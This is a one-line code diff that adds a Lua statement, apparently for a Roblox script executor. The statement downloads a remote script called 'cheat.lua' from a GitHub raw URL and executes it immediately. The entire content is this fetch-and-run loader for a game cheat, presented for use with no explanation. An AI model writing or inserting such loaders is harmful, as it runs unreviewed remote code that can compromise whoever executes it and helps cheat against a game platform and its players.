@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/MidasRX/lua/main/cheat.lua'))()
